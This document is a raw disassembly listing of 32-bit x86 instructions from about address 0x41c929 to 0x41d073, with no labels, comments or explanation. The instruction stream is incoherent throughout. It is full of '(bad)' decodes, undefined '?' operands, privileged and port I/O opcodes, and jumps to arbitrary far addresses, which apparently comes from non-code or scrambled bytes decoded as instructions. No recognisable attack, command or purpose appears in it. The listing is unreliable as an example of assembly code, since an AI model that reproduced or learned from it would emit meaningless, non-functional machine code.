  41c929:	jne    0x41c8fe
  41c92b:	idiv   BYTE PTR ds:0x4a837bc7
  41c931:	sub    DWORD PTR [ebp+eiz*8-0x519e9e4],edx
  41c938:	mov    bh,0x2b
  41c93a:	jns    0x41c90a
  41c93c:	or     eax,0x8ee060cc
  41c941:	loop   0x41c8da
  41c943:	push   cs
  41c944:	fldenv [ecx+0x76]
  41c947:	mov    eax,ds:0x439b8142
  41c94c:	stc    
  41c94d:	jbe    0x41c9c5
  41c94f:	jl     0x41c90c
  41c951:	xchg   esi,eax
  41c952:	aas    
  41c953:	jno    0x41c966
  41c955:	outs   dx,BYTE PTR ds:[esi]
  41c956:	push   es
  41c957:	(bad)  [eax-0x6c]
  41c95a:	jo     0x41c9cc
  41c95c:	mov    ?,esi
  41c95e:	lock addr16 ja 0x41c9d0
  41c962:	test   DWORD PTR [edx-0x34fdfa99],edx
  41c968:	xor    al,ah
  41c96a:	or     esi,DWORD PTR gs:[esi-0x3b]
  41c96e:	rcl    DWORD PTR [edx-0x18],cl
  41c971:	js     0x41c929
  41c973:	into   
  41c974:	sub    eax,0xab6e284f
  41c979:	pushf  
  41c97a:	jl     0x41c8ff
  41c97c:	xchg   BYTE PTR [edx+0x17],al
  41c97f:	jmp    0xb659b477
  41c984:	inc    esi
  41c985:	stos   BYTE PTR es:[edi],al
  41c986:	dec    ebp
  41c987:	test   eax,0xedef06db
  41c98c:	dec    edi
  41c98d:	or     bl,dh
  41c98f:	or     dh,BYTE PTR [ecx-0x7c9230ad]
  41c995:	shl    DWORD PTR [ebx-0x3dd3205f],0x90
  41c99c:	fsubr  st,st(1)
  41c99e:	ret    0x46dc
  41c9a1:	icebp  
  41c9a2:	inc    eax
  41c9a3:	popa   
  41c9a4:	repz cli 
  41c9a6:	adc    BYTE PTR [ebp+0x6384b352],0xaa
  41c9ad:	adc    DWORD PTR [ebx+0xe],0xd03f106
  41c9b4:	cmp    al,0xf
  41c9b6:	xchg   ecx,eax
  41c9b7:	sbb    dl,cl
  41c9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ba:	mov    cl,0xb4
  41c9bc:	js     0x41ca17
  41c9be:	dec    ecx
  41c9bf:	cmp    dh,ch
  41c9c1:	iret   
  41c9c2:	add    ebp,edi
  41c9c4:	inc    esi
  41c9c5:	cmp    eax,0x51ac27df
  41c9ca:	mov    ch,0xf6
  41c9cc:	xchg   ecx,eax
  41c9cd:	dec    esp
  41c9ce:	mov    fs,WORD PTR [edi+0x181d4674]
  41c9d4:	shl    BYTE PTR [eax],cl
  41c9d6:	or     eax,0x7033544c
  41c9db:	dec    edx
  41c9dc:	shr    dh,cl
  41c9de:	pop    ecx
  41c9df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e0:	data16 sbb BYTE PTR [ebp+ebx*8-0x51],ch
  41c9e5:	mov    esi,0x2d5a6c62
  41c9ea:	jmp    0xbe9:0x2c21ae1b
  41c9f1:	iret   
  41c9f2:	pop    es
  41c9f3:	add    bh,bl
  41c9f5:	mov    ecx,0x4c0680c8
  41c9fa:	sbb    ax,0x79c
  41c9fe:	push   ecx
  41c9ff:	imul   ecx,DWORD PTR [esi-0x3a],0x6a5a21fc
  41ca06:	ret    0xc0d4
  41ca09:	retf   0xd25a
  41ca0c:	in     al,dx
  41ca0d:	cmp    BYTE PTR [edi],0x24
  41ca10:	lea    eax,[eax]
  41ca12:	cmp    eax,0xdaa73f5f
  41ca17:	cs mov edx,0x9f11b7e7
  41ca1d:	clc    
  41ca1e:	push   eax
  41ca1f:	int3   
  41ca20:	daa    
  41ca21:	int    0x79
  41ca23:	jmp    0xb1dba461
  41ca28:	mov    eax,0x4b9af838
  41ca2d:	mov    bl,bh
  41ca2f:	sahf   
  41ca30:	imul   ebx,DWORD PTR [eax+0x4b],0x10
  41ca34:	dec    edi
  41ca35:	outs   dx,DWORD PTR ds:[esi]
  41ca36:	or     dh,dl
  41ca38:	pop    edi
  41ca39:	int    0xa
  41ca3b:	push   esp
  41ca3c:	sbb    DWORD PTR [edx+0x5],esi
  41ca3f:	pop    edi
  41ca40:	jns    0x41ca60
  41ca42:	in     al,dx
  41ca43:	inc    esp
  41ca44:	mov    edi,0xe178ea5e
  41ca49:	neg    BYTE PTR [ebp-0x726f1a62]
  41ca4f:	mov    edx,0xe96391d0
  41ca54:	je     0x41ca15
  41ca56:	jns    0x41caae
  41ca58:	or     DWORD PTR [eax+0x5357064e],edi
  41ca5e:	scas   al,BYTE PTR es:[edi]
  41ca5f:	push   edx
  41ca60:	xor    bh,dh
  41ca62:	push   cs
  41ca63:	data16 jmp 0x41ca46
  41ca66:	pop    esp
  41ca67:	nop
  41ca68:	or     eax,0x3e66e07b
  41ca6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca6e:	xor    eax,0xc5f1133c
  41ca73:	mov    dh,0x1b
  41ca75:	cli    
  41ca76:	xchg   esi,ebx
  41ca78:	lock shl BYTE PTR [ebp+0x134f75c9],1
  41ca7f:	call   0x7229:0x372d40e8
  41ca86:	test   al,0xf6
  41ca88:	imul   ebx,DWORD PTR [esi],0x3e49b9e0
  41ca8e:	fsubr  QWORD PTR [eax+0x5a3f8a26]
  41ca94:	imul   eax,DWORD PTR ds:0x32f18e46,0xffffffe7
  41ca9b:	shr    BYTE PTR [esi+0x7beece83],cl
  41caa1:	mov    al,0x65
  41caa3:	in     al,0x1
  41caa5:	push   esp
  41caa6:	inc    eax
  41caa7:	sbb    al,0x4
  41caa9:	(bad)
  41caad:	xchg   edi,eax
  41caae:	shl    DWORD PTR [ecx-0x2a],1
  41cab1:	mov    BYTE PTR [ecx+0x53],cl
  41cab4:	fdiv   QWORD PTR [bp-0x6c40]
  41cab9:	adc    dh,BYTE PTR [ebp-0x25b7401]
  41cabf:	pop    esi
  41cac0:	mov    DWORD PTR [esi-0x16ce687a],ecx
  41cac6:	mov    ds:0xed8c2708,al
  41cacb:	inc    esp
  41cacc:	rol    DWORD PTR [ebx-0x142d56ee],cl
  41cad2:	pop    esi
  41cad3:	push   esp
  41cad4:	fld    DWORD PTR [ebp-0x3f93adec]
  41cada:	cs aad 0xf3
  41cadd:	add    BYTE PTR [edi-0x5e3cdedc],ch
  41cae3:	xchg   BYTE PTR [eax-0x6f],bh
  41cae6:	xor    DWORD PTR [bx+si+0x722f],ebp
  41caeb:	xor    BYTE PTR [edx+ecx*4+0x30],ah
  41caef:	and    al,0xe4
  41caf1:	jmp    0x49b7:0x4f9ea9f8
  41caf8:	mov    edx,0x529c7be3
  41cafd:	xor    DWORD PTR [edi],0x7a461e4d
  41cb03:	push   cs
  41cb04:	dec    eax
  41cb05:	out    0xad,eax
  41cb07:	add    eax,0xcdb65559
  41cb0c:	dec    esp
  41cb0d:	loopne 0x41cab0
  41cb0f:	cmp    bl,BYTE PTR [ebp+eax*4-0x29]
  41cb13:	xlat   BYTE PTR ds:[ebx]
  41cb14:	adc    esp,edx
  41cb16:	pop    esi
  41cb17:	pop    esp
  41cb18:	xchg   BYTE PTR [edi],bh
  41cb1a:	bound  ebp,QWORD PTR [edi-0x5463313e]
  41cb20:	repnz sbb al,0x91
  41cb23:	pop    ds
  41cb24:	cmp    eax,0xe1847690
  41cb29:	int    0xb9
  41cb2b:	jnp    0x41cb81
  41cb2d:	out    0xd1,eax
  41cb2f:	xlat   BYTE PTR ds:[ebx]
  41cb30:	(bad)  
  41cb31:	fldenv [edx-0x61]
  41cb34:	pop    esp
  41cb35:	sub    al,0x33
  41cb37:	out    0x9d,eax
  41cb39:	into   
  41cb3a:	pop    esi
  41cb3b:	gs mov al,0xbe
  41cb3e:	mov    edi,0x5218ac12
  41cb43:	lds    esp,FWORD PTR [ebx]
  41cb45:	mov    ebp,0x386ed0b1
  41cb4a:	sub    BYTE PTR [edx+0x2cb32380],al
  41cb50:	inc    edx
  41cb51:	jae    0x41cb8b
  41cb53:	int3   
  41cb54:	out    dx,al
  41cb55:	add    BYTE PTR [esi-0x779ded0b],al
  41cb5b:	loope  0x41cb1d
  41cb5d:	push   0x3612609d
  41cb62:	cmp    eax,0xcb318653
  41cb67:	mov    dl,0x5e
  41cb69:	aas    
  41cb6a:	adc    BYTE PTR [eax],dl
  41cb6c:	and    BYTE PTR [ebx],ah
  41cb6e:	rcr    DWORD PTR [eax],0x69
  41cb71:	stos   DWORD PTR es:[edi],eax
  41cb72:	scas   eax,DWORD PTR es:[edi]
  41cb73:	ins    DWORD PTR es:[edi],dx
  41cb74:	pop    ecx
  41cb75:	mov    ds:0xb0585af4,al
  41cb7a:	xchg   ecx,eax
  41cb7b:	enter  0x6ed1,0x13
  41cb7f:	mov    bh,0x5e
  41cb81:	shr    BYTE PTR [esi-0x5],0xc8
  41cb85:	inc    BYTE PTR [edx]
  41cb87:	pop    esi
  41cb88:	iret   
  41cb89:	aaa    
  41cb8a:	cli    
  41cb8b:	push   ebp
  41cb8c:	inc    BYTE PTR [ebx+0x24309004]
  41cb92:	push   0x10
  41cb94:	xchg   esi,eax
  41cb95:	clts   
  41cb97:	clc    
  41cb98:	retf   0x46b
  41cb9b:	inc    esi
  41cb9c:	cld    
  41cb9d:	inc    ecx
  41cb9e:	inc    eax
  41cb9f:	out    dx,al
  41cba0:	fdivp  st(5),st
  41cba2:	add    al,0x4f
  41cba4:	jle    0x41cbb4
  41cba6:	shr    DWORD PTR [edx+0x9],cl
  41cba9:	push   0xcabdc4a1
  41cbae:	dec    edx
  41cbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbb0:	loop   0x41cbea
  41cbb2:	sbb    eax,0xd27018bd
  41cbb7:	mov    edi,0x66fd9b85
  41cbbc:	call   0xe62e7fa5
  41cbc1:	sbb    BYTE PTR [edi],ah
  41cbc3:	cmp    al,0x7e
  41cbc5:	retf   
  41cbc6:	outs   dx,BYTE PTR ds:[esi]
  41cbc7:	pushw  cs
  41cbc9:	(bad)  
  41cbca:	and    edx,edx
  41cbcc:	scas   al,BYTE PTR es:[edi]
  41cbcd:	cmp    al,0xf6
  41cbcf:	push   esi
  41cbd0:	xor    al,0x72
  41cbd2:	js     0x41cc4e
  41cbd4:	mov    ebx,0xa12f41e0
  41cbd9:	lea    eax,[esi]
  41cbdb:	outs   dx,DWORD PTR ds:[esi]
  41cbdc:	dec    ecx
  41cbdd:	ins    BYTE PTR es:[edi],dx
  41cbde:	dec    edx
  41cbdf:	or     eax,0x10f09fd5
  41cbe4:	cmc    
  41cbe5:	cmp    edi,DWORD PTR [ecx+0x47]
  41cbe8:	sub    BYTE PTR [edi+eiz*4+0x1],ah
  41cbec:	sbb    DWORD PTR [ecx],edx
  41cbee:	pop    ebx
  41cbef:	(bad)  
  41cbf0:	stos   DWORD PTR es:[edi],eax
  41cbf1:	ds ja  0x41cc26
  41cbf4:	and    edx,DWORD PTR [eax+0x2906f438]
  41cbfa:	in     al,dx
  41cbfb:	pop    esp
  41cbfc:	js     0x41cbff
  41cbfe:	das    
  41cbff:	push   esp
  41cc00:	mov    al,ds:0x410805cf
  41cc05:	mov    ah,0xee
  41cc07:	mov    ah,0xd2
  41cc09:	gs in  eax,dx
  41cc0b:	ror    edx,1
  41cc0d:	inc    ecx
  41cc0e:	jnp    0x41cba9
  41cc10:	adc    eax,0x6d52f284
  41cc15:	sub    esi,ebp
  41cc17:	inc    eax
  41cc18:	xor    BYTE PTR [edx],bh
  41cc1a:	and    ebx,DWORD PTR [edx-0x5a]
  41cc1d:	add    dl,BYTE PTR [ebp+0x49e41ed]
  41cc23:	rcr    BYTE PTR [ebp+0x183cf7e3],0x5d
  41cc2a:	mov    BYTE PTR [eax-0x286e15e2],dl
  41cc30:	test   eax,0xca9b081a
  41cc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc36:	sbb    DWORD PTR [edi+0x33],esi
  41cc39:	pop    edi
  41cc3a:	enter  0x63d8,0xcc
  41cc3e:	aam    0x7
  41cc40:	dec    esi
  41cc41:	sub    DWORD PTR [ebx],edi
  41cc43:	add    eax,0xbba4603a
  41cc48:	sub    DWORD PTR [ebx+0x35c47fb3],eax
  41cc4e:	jae    0x41cc5b
  41cc50:	rcl    ah,cl
  41cc52:	xor    cl,ch
  41cc54:	mov    al,BYTE PTR [edx-0x3d799365]
  41cc5a:	push   es
  41cc5b:	out    dx,al
  41cc5c:	cmp    eax,0xc2432c4
  41cc61:	les    eax,FWORD PTR [eax-0x4c1b55e]
  41cc67:	in     eax,dx
  41cc68:	mov    ds:0x2b19fef,al
  41cc6d:	xchg   esp,eax
  41cc6e:	push   ecx
  41cc6f:	(bad)  
  41cc71:	xchg   ebx,eax
  41cc72:	xchg   esp,eax
  41cc73:	retf   
  41cc74:	inc    ebx
  41cc75:	pop    ss
  41cc76:	inc    esp
  41cc77:	mov    ds:0x37e6ff72,eax
  41cc7c:	aad    0x2b
  41cc7e:	dec    ecx
  41cc7f:	and    esp,DWORD PTR [ecx+0x4d]
  41cc82:	jnp    0x41cc05
  41cc84:	inc    ebp
  41cc85:	cmp    esp,DWORD PTR [edx-0x2f]
  41cc88:	inc    edx
  41cc89:	stc    
  41cc8a:	inc    eax
  41cc8b:	ins    BYTE PTR es:[edi],dx
  41cc8c:	push   esi
  41cc8d:	cli    
  41cc8e:	cmc    
  41cc8f:	popf   
  41cc90:	xchg   DWORD PTR [esi+0x2e94cd13],ecx
  41cc96:	pop    ebx
  41cc97:	mov    esp,0x34af9484
  41cc9c:	mov    ebx,0x99d8b3d1
  41cca1:	sti    
  41cca2:	xchg   esp,eax
  41cca3:	stos   DWORD PTR es:[edi],eax
  41cca4:	mov    ch,0xd3
  41cca6:	fdivr  st,st(6)
  41cca8:	xor    al,0x15
  41ccaa:	cmp    ah,bl
  41ccac:	enter  0xfb8d,0x76
  41ccb0:	xor    dh,dl
  41ccb2:	popa   
  41ccb3:	mov    cl,0xc1
  41ccb5:	mov    ds:0x6224f0,al
  41ccba:	mov    ebx,DWORD PTR [eax]
  41ccbc:	lds    ebx,FWORD PTR [ebp+0x7cbdee12]
  41ccc2:	jecxz  0x41cd3e
  41ccc4:	or     eax,0x58a29736
  41ccc9:	mov    ebx,0xea38c6d5
  41ccce:	cwde   
  41cccf:	push   cs
  41ccd0:	loop   0x41cd19
  41ccd2:	mov    cl,0xfa
  41ccd4:	dec    esp
  41ccd5:	mov    ch,0x39
  41ccd7:	push   ebp
  41ccd8:	mov    bh,0xce
  41ccda:	in     al,dx
  41ccdb:	mov    ds:0xf9300d00,al
  41cce0:	daa    
  41cce1:	imul   esp,DWORD PTR [edi],0x18
  41cce4:	jne    0x41cd28
  41cce6:	cmp    bh,BYTE PTR [esi-0x57868cab]
  41ccec:	addr16 fcom st(3)
  41ccef:	mov    eax,ds:0x2103a3f4
  41ccf4:	jg     0x41cd29
  41ccf6:	aas    
  41ccf7:	pop    eax
  41ccf8:	pop    ebp
  41ccf9:	outs   dx,BYTE PTR ds:[esi]
  41ccfa:	adc    BYTE PTR [edx],bl
  41ccfc:	fs test al,0xc0
  41ccff:	dec    edi
  41cd00:	xor    al,0x5c
  41cd02:	(bad)  
  41cd04:	pop    ss
  41cd05:	sbb    bl,0x42
  41cd08:	ficomp WORD PTR [eax+0xa1fe78f]
  41cd0e:	dec    DWORD PTR [ebp-0x2b312f6d]
  41cd14:	es (bad) 
  41cd16:	rcl    DWORD PTR [ebp-0x44be3af],cl
  41cd1c:	cmp    al,BYTE PTR [eax]
  41cd1e:	add    esp,ebx
  41cd20:	jle    0x41cd27
  41cd22:	pop    esp
  41cd23:	in     eax,0xf1
  41cd25:	in     eax,dx
  41cd26:	repz cmp ah,ah
  41cd29:	lds    esp,FWORD PTR [ecx-0x48b35848]
  41cd2f:	enter  0xc308,0xb6
  41cd33:	iret   
  41cd34:	test   BYTE PTR [edi],0x4b
  41cd37:	loope  0x41ccc9
  41cd39:	xchg   DWORD PTR [ebp-0x2c],edx
  41cd3c:	dec    esi
  41cd3d:	cmp    ebp,edi
  41cd3f:	jl     0x41cd2d
  41cd41:	arpl   WORD PTR ds:0x9f8f3875,di
  41cd47:	stos   BYTE PTR es:[edi],al
  41cd48:	sub    eax,0x8960e9d9
  41cd4d:	add    esi,edi
  41cd4f:	sbb    BYTE PTR [ecx],ah
  41cd51:	pop    ecx
  41cd52:	xchg   edx,eax
  41cd53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd54:	fwait
  41cd55:	push   es
  41cd56:	jle    0x41cd3b
  41cd58:	mov    cl,0x9f
  41cd5a:	add    cl,BYTE PTR [edi-0x63]
  41cd5d:	clc    
  41cd5e:	shl    BYTE PTR [edx-0x3cbe5f09],cl
  41cd64:	outs   dx,DWORD PTR ds:[esi]
  41cd65:	jns    0x41cd2f
  41cd67:	lods   eax,DWORD PTR ds:[esi]
  41cd68:	pusha  
  41cd69:	and    dl,cl
  41cd6b:	mov    ebp,0x91a4ed54
  41cd70:	adc    ebp,ebp
  41cd72:	test   BYTE PTR cs:[edx],al
  41cd75:	push   0x9eca89f
  41cd7a:	xor    edx,DWORD PTR [ebp+0x41]
  41cd7d:	mov    gs,WORD PTR [eax+0x39835f8]
  41cd83:	mov    ebp,0xc1b57654
  41cd88:	jno    0x41cd41
  41cd8a:	stos   BYTE PTR es:[edi],al
  41cd8b:	pop    edi
  41cd8c:	mov    ecx,0xdc8ff896
  41cd91:	mov    ebx,0x7e279427
  41cd96:	idiv   BYTE PTR [ebx+edi*2+0x56]
  41cd9a:	sub    al,0x38
  41cd9c:	xchg   esi,eax
  41cd9d:	push   edi
  41cd9e:	out    dx,al
  41cd9f:	and    bh,BYTE PTR [eax]
  41cda1:	jle    0x41cda7
  41cda3:	mov    al,0xac
  41cda5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda6:	repz jg 0x41cd57
  41cda9:	cld    
  41cdaa:	xor    esi,esp
  41cdac:	das    
  41cdad:	jne    0x41cd35
  41cdaf:	pop    edx
  41cdb0:	or     BYTE PTR [ebp+0x4f40afc7],cl
  41cdb6:	add    DWORD PTR [ecx],edi
  41cdb8:	es aas 
  41cdba:	ins    DWORD PTR es:[edi],dx
  41cdbb:	jbe    0x41cd5e
  41cdbd:	inc    ebp
  41cdbe:	mov    ds:0xf4c3423f,eax
  41cdc3:	pusha  
  41cdc4:	dec    esi
  41cdc5:	repz (bad) 
  41cdc7:	test   DWORD PTR [ebp-0x743dbd2e],0x2316f2b3
  41cdd1:	outs   dx,BYTE PTR ds:[esi]
  41cdd2:	xor    ebx,DWORD PTR [ebp-0x2f]
  41cdd5:	inc    ebx
  41cdd6:	or     dh,cl
  41cdd8:	xchg   esp,eax
  41cdd9:	pop    ecx
  41cdda:	mov    cl,0x5c
  41cddc:	or     esi,DWORD PTR [ebx+0x35]
  41cddf:	fs test al,0x9c
  41cde2:	int3   
  41cde3:	frstor [eax-0x7ab68f5e]
  41cde9:	stc    
  41cdea:	mov    edi,0x514ab828
  41cdef:	jp     0x41ce41
  41cdf1:	push   ds
  41cdf2:	test   bh,ch
  41cdf4:	dec    ebp
  41cdf5:	push   eax
  41cdf6:	and    eax,0xa8eb96b1
  41cdfb:	push   0x44
  41cdfd:	ja     0x41cde7
  41cdff:	out    0x96,eax
  41ce01:	call   0x93c4:0x5e40afa1
  41ce08:	hlt    
  41ce09:	mov    bh,0xbb
  41ce0b:	adc    dl,BYTE PTR [edx+eax*8-0x65]
  41ce0f:	int    0xf1
  41ce11:	jl     0x41ce42
  41ce13:	pop    ebp
  41ce14:	xchg   edx,ebp
  41ce16:	mov    ebx,0x97e7ab62
  41ce1b:	lods   eax,DWORD PTR ds:[esi]
  41ce1c:	mov    es,WORD PTR [edx-0xf]
  41ce1f:	out    dx,al
  41ce20:	xor    ch,ch
  41ce22:	gs mov edx,0x7796585c
  41ce28:	sahf   
  41ce29:	in     al,dx
  41ce2a:	inc    ecx
  41ce2b:	aad    0x5f
  41ce2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce2e:	dec    eax
  41ce2f:	mov    al,0x5f
  41ce31:	pop    edi
  41ce32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce33:	rcr    DWORD PTR ds:0x9c11686,cl
  41ce39:	or     BYTE PTR [ebx+0x1b],bl
  41ce3c:	(bad)  
  41ce3e:	cwde   
  41ce3f:	icebp  
  41ce40:	push   esp
  41ce41:	stos   DWORD PTR es:[edi],eax
  41ce42:	mov    eax,0x6b643fa5
  41ce47:	int3   
  41ce48:	adc    ebp,ecx
  41ce4a:	mov    DWORD PTR [ecx-0x79],esp
  41ce4d:	mov    esp,0x39242f0f
  41ce52:	pop    edi
  41ce53:	ficomp DWORD PTR [ecx]
  41ce55:	mov    ah,0x5
  41ce57:	fcom   DWORD PTR [ebx+0x34]
  41ce5a:	push   0xffffffd2
  41ce5c:	mov    ch,0x25
  41ce5e:	repz inc edx
  41ce60:	out    0xb5,al
  41ce62:	retf   0x9d2a
  41ce65:	inc    esi
  41ce66:	pmaxsw mm2,QWORD PTR [esi+esi*2]
  41ce6a:	mov    ds:0x298678a2,eax
  41ce6f:	jbe    0x41ce5a
  41ce71:	popf   
  41ce72:	int3   
  41ce73:	push   0x743e4eaa
  41ce78:	sbb    dl,ch
  41ce7a:	pop    esp
  41ce7b:	out    dx,eax
  41ce7c:	pop    eax
  41ce7d:	bound  esp,QWORD PTR [edx-0x6e59965b]
  41ce83:	or     BYTE PTR [eax],ch
  41ce85:	jl     0x41cedd
  41ce87:	push   esp
  41ce88:	add    DWORD PTR [eax-0x77],0xa837ed5c
  41ce8f:	jl     0x41ceba
  41ce91:	pushf  
  41ce92:	(bad)  
  41ce93:	dec    BYTE PTR [edx+0x414aa3b6]
  41ce99:	jb     0x41ce4c
  41ce9b:	jno    0x41ce8f
  41ce9d:	fcomp  DWORD PTR [edx]
  41ce9f:	retf   
  41cea0:	dec    esi
  41cea1:	cmc    
  41cea2:	jae    0x41ce85
  41cea4:	int    0x45
  41cea6:	repnz push 0xfffffff4
  41cea9:	sbb    BYTE PTR [edx+eiz*1+0x270c8444],ch
  41ceb0:	or     eax,0x4694dd9e
  41ceb5:	enter  0x70d4,0xc3
  41ceb9:	push   eax
  41ceba:	add    al,0x11
  41cebc:	bound  ebx,QWORD PTR [ebp+edx*1-0x1]
  41cec0:	jl     0x41cf26
  41cec2:	jecxz  0x41ce79
  41cec4:	pop    eax
  41cec5:	sbb    DWORD PTR [ebx+0x2c2fc3d0],eax
  41cecb:	arpl   cx,bx
  41cecd:	pop    esi
  41cece:	push   ebp
  41cecf:	out    dx,al
  41ced0:	(bad)  
  41ced3:	dec    esp
  41ced4:	cwde   
  41ced5:	rol    BYTE PTR [si],cl
  41ced8:	in     al,dx
  41ced9:	ins    BYTE PTR es:[edi],dx
  41ceda:	mov    WORD PTR [ebx-0x76],cs
  41cedd:	mov    esp,0x91146d65
  41cee2:	push   cs
  41cee3:	outs   dx,DWORD PTR ss:[esi]
  41cee5:	xor    al,0x25
  41cee7:	xchg   esp,eax
  41cee8:	daa    
  41cee9:	xor    dh,dl
  41ceeb:	je     0x41ced0
  41ceed:	mov    DWORD PTR [esp+ebp*8],ecx
  41cef0:	iret   
  41cef1:	outs   dx,BYTE PTR ds:[esi]
  41cef2:	mov    ch,0xab
  41cef4:	push   es
  41cef5:	out    dx,eax
  41cef6:	sahf   
  41cef7:	sub    BYTE PTR [edx-0x79],bh
  41cefa:	inc    esp
  41cefb:	or     al,0xa1
  41cefd:	jns    0x41cf62
  41ceff:	push   ds
  41cf00:	push   ds
  41cf01:	jle    0x41cecb
  41cf03:	add    bl,bh
  41cf05:	das    
  41cf06:	sahf   
  41cf07:	mov    ecx,ebx
  41cf09:	test   eax,0x4da4230a
  41cf0e:	cmc    
  41cf0f:	push   edx
  41cf10:	pop    ds
  41cf11:	fadd   QWORD PTR ds:0xc99dff2a
  41cf17:	mov    esi,0xb83040c5
  41cf1c:	xor    eax,0x1a5b729b
  41cf21:	les    edi,FWORD PTR [ebp+0x4ca34c6a]
  41cf27:	aam    0x88
  41cf29:	ja     0x41cf76
  41cf2b:	ret    0xad79
  41cf2e:	stos   DWORD PTR es:[edi],eax
  41cf2f:	cld    
  41cf30:	out    dx,eax
  41cf31:	jg     0x41cf73
  41cf33:	shl    esi,0x69
  41cf36:	pop    esp
  41cf37:	cmp    DWORD PTR [ebx],esi
  41cf39:	xchg   dl,ch
  41cf3b:	shl    DWORD PTR [esi+0x2e],0xbe
  41cf3f:	cmp    al,0x91
  41cf41:	mov    BYTE PTR [eax-0x30],0xf4
  41cf45:	shr    BYTE PTR [ecx+esi*2],0x30
  41cf49:	mov    dh,0x58
  41cf4b:	cmp    DWORD PTR [edi+0x67d7dd3c],0xffffffe3
  41cf52:	int    0x5c
  41cf54:	std    
  41cf55:	fidivr DWORD PTR [eax+0x62]
  41cf58:	stc    
  41cf59:	add    ebx,DWORD PTR [ebp+0x2d]
  41cf5c:	scas   eax,DWORD PTR es:[edi]
  41cf5d:	(bad)  
  41cf5e:	mov    dl,0xfb
  41cf60:	js     0x41cf76
  41cf62:	icebp  
  41cf63:	push   cs
  41cf64:	bound  esp,QWORD PTR [eax+0x6ef0e61e]
  41cf6a:	xor    DWORD PTR [ecx+0x19],ecx
  41cf6d:	fadd   QWORD PTR [edx+0x3a]
  41cf70:	xchg   ecx,eax
  41cf71:	xor    bl,dh
  41cf73:	mov    edx,0xa8a0bf43
  41cf78:	xchg   esi,eax
  41cf79:	retf   
  41cf7a:	dec    ebp
  41cf7b:	fwait
  41cf7c:	jne    0x41cfc8
  41cf7e:	cmp    ah,al
  41cf80:	data16 addr16 jne 0x41cfae
  41cf84:	test   al,0x2b
  41cf86:	bnd jl 0x41cf23
  41cf89:	xchg   ebp,eax
  41cf8a:	xor    eax,0x2d1395bd
  41cf8f:	pusha  
  41cf90:	cmc    
  41cf91:	neg    DWORD PTR [edi+0x15]
  41cf94:	mov    bl,0xda
  41cf96:	inc    esp
  41cf97:	imul   ebp,DWORD PTR [esi],0x45
  41cf9a:	or     edx,esp
  41cf9c:	loope  0x41cf22
  41cf9e:	neg    BYTE PTR [esi-0x7751922a]
  41cfa4:	leave  
  41cfa5:	dec    ebx
  41cfa6:	add    BYTE PTR [edx+0x64227b86],al
  41cfac:	mov    esp,0x74efe29a
  41cfb1:	inc    esp
  41cfb2:	sbb    esp,DWORD PTR fs:[esi]
  41cfb5:	fcom   QWORD PTR [edi+0x52]
  41cfb8:	out    dx,al
  41cfb9:	push   esp
  41cfba:	xor    edi,ebp
  41cfbc:	(bad)  
  41cfbd:	jecxz  0x41cfe8
  41cfbf:	test   al,0x64
  41cfc1:	xor    eax,0xc43fb80e
  41cfc6:	out    0x34,al
  41cfc8:	in     al,dx
  41cfc9:	les    eax,FWORD PTR [ebx-0x3b]
  41cfcc:	and    BYTE PTR [edi],ch
  41cfce:	rcl    BYTE PTR [esi-0x11d46bfc],1
  41cfd4:	mov    ds:0x223fac9c,al
  41cfd9:	jmp    0xdb44:0xffc3b199
  41cfe0:	xchg   ebp,eax
  41cfe1:	push   eax
  41cfe2:	pop    ebx
  41cfe3:	add    eax,0x1dd02b8
  41cfe8:	fimul  DWORD PTR [edx+0x1e]
  41cfeb:	vpshad ymm8,xmm1,xmm0
  41cff0:	add    DWORD PTR [edi],0x6f
  41cff3:	daa    
  41cff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff5:	imul   DWORD PTR [edx]
  41cff7:	cmc    
  41cff8:	mov    cl,0x69
  41cffa:	lods   eax,DWORD PTR ds:[esi]
  41cffb:	xor    eax,0x614464b1
  41d000:	cli    
  41d001:	pop    eax
  41d002:	in     eax,dx
  41d003:	mov    ah,0xd8
  41d005:	sbb    DWORD PTR [ebx+esi*4],ebx
  41d008:	push   ebp
  41d009:	cwde   
  41d00a:	retf   
  41d00b:	fdiv   QWORD PTR ds:0xf3189a33
  41d011:	pop    es
  41d012:	cs je  0x41d02e
  41d015:	mov    al,ds:0x39e65688
  41d01a:	pop    eax
  41d01b:	xchg   dh,ch
  41d01d:	xchg   ecx,eax
  41d01e:	and    DWORD PTR [edi],ebx
  41d020:	fwait
  41d021:	mov    ds:0x77e3df6e,eax
  41d026:	jge    0x41d063
  41d028:	lods   al,BYTE PTR ds:[esi]
  41d029:	ins    DWORD PTR es:[edi],dx
  41d02a:	stc    
  41d02b:	mov    ?,WORD PTR [edx]
  41d02d:	test   al,0x8a
  41d02f:	popa   
  41d030:	inc    ebx
  41d031:	das    
  41d032:	sbb    edi,DWORD PTR [edi+0x78c73d93]
  41d038:	pop    edx
  41d039:	cmc    
  41d03a:	jnp    0x41d07d
  41d03c:	lea    ebp,[ecx+ecx*4]
  41d03f:	xlat   BYTE PTR ds:[ebx]
  41d040:	sbb    bl,BYTE PTR [esi+0x71cf2211]
  41d046:	les    eax,FWORD PTR [eax]
  41d048:	stc    
  41d049:	jle    0x41d0ca
  41d04b:	pushf  
  41d04c:	cli    
  41d04d:	sub    edi,DWORD PTR [ebx+0x69]
  41d050:	pop    ebx
  41d051:	push   ebx
  41d052:	add    al,0xd0
  41d054:	out    0xa7,eax
  41d056:	out    0x3e,al
  41d058:	stos   BYTE PTR es:[edi],al
  41d059:	inc    esp
  41d05a:	xchg   ebp,eax
  41d05b:	mov    eax,ds:0x107579f7
  41d060:	and    ebx,DWORD PTR [edx+0xb]
  41d063:	and    al,0x5
  41d065:	dec    ecx
  41d066:	ja     0x41cffa
  41d068:	add    eax,0xbb149162
  41d06d:	xchg   ebx,eax
  41d06e:	lods   al,BYTE PTR ds:[esi]
  41d06f:	adc    BYTE PTR [edx],0x5a
  41d072:	inc    ebx
  41d073:	mov    bl,0x25
